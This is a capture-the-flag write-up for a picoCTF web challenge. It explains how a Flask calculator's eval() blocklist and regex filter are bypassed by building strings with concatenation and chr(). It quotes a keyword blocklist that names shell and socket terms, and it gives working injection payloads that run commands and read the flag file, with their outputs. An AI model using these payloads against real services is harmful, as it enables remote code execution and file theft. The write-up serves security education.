# 3v@1

**Platform:** CyLab Security Academy (picoCTF)
**Category:** Web Exploitation
**Difficulty:** Medium
**Flag:** `picoCTF{D0nt_Use_Unsecure_f@nctionsf847a9bc}`

## Summary

A Flask "loan calculator" evaluates a user-supplied formula with Python's `eval()`. The page's
own HTML source leaves a TODO comment describing exactly what security measures were *planned*
but apparently not yet fully implemented: a keyword blocklist and a filter regex. Both are easy
to route around since the checks operate on the raw submitted text, while `eval()` still executes
whatever that text resolves to at runtime, including strings and characters built dynamically
via concatenation and `chr()` that never appear literally in the submission.

## Discovery

The homepage's raw HTML includes:

```html
<!--
    TODO
    ------------
    Secure python_flask eval execution by
        1.blocking malcious keyword like os,eval,exec,bind,connect,python,socket,ls,cat,shell,bind
        2.Implementing regex: r'0x[0-9A-Fa-f]+|\\u[0-9A-Fa-f]{4}|%[0-9A-Fa-f]{2}|\.[A-Za-z0-9]{1,3}\b|[\\\/]|\.\.'
-->
```

That regex blocks: hex literals (`0x..`), unicode escapes (`\u....`), percent-encoding
(`%XX`), any short dot-suffix like a file extension (`\.[A-Za-z0-9]{1,3}\b`, e.g. `.txt`, `.py`),
any slash character at all, and literal `..`. The keyword list blocks the substrings `os`,
`eval`, `exec`, `bind`, `connect`, `python`, `socket`, `ls`, `cat`, `shell`.

All of these are substring/character checks against the raw submitted `code` field, run before
`eval()` ever executes it. None of them stop the *result* of string concatenation or `chr()`
calls from containing a blocked character once the expression actually runs.

## Proof of Concept

Get the `os` module without the literal substring `os` ever appearing (splitting it across a
string concatenation defeats a substring check):

```
code=__import__('o'+'s').popen('id').read()
```

```
Result: uid=999(app) gid=999(app) groups=999(app)
```

`listdir`/`read` are safe method names (`ls`/`cat` don't appear as substrings in them, and their
length keeps them clear of the short dot-suffix regex). Slashes and dots for building actual
filesystem paths are constructed at runtime via `chr()` instead of typed literally, since the
character-level filter only sees the raw source text, not values computed during evaluation:

```
code=__import__('o'+'s').popen('find '+chr(47)+' -iname flag* 2'+chr(62)+chr(47)+'dev'+chr(47)+'null').read()
```

```
Result: /challenge/flag.py
/flag.txt
```

Reading the flag directly, again building the slash and the dot of the `.txt` extension via
`chr()` so neither appears in the submitted text:

```
code=open(chr(47)+'flag'+chr(46)+'txt').read()
```

```
Result: picoCTF{D0nt_Use_Unsecure_f@nctionsf847a9bc}
```

## Root Cause

`eval()` on user input is unsafe regardless of how it's guarded, because any sufficiently
expressive language (Python included) can reconstruct forbidden characters, words, and values at
runtime from pieces that individually pass a static, text-level filter. Blocklists that only
inspect the source text before execution can never fully account for what that text can compute
once it actually runs.

## CWE / OWASP

- **CWE-95**: Improper Neutralization of Directives in Dynamically Evaluated Code (`Eval Injection`)
- **CWE-693**: Protection Mechanism Failure (blocklist bypassed via string
  concatenation/`chr()` reconstruction)
- **OWASP A03:2021**: Injection
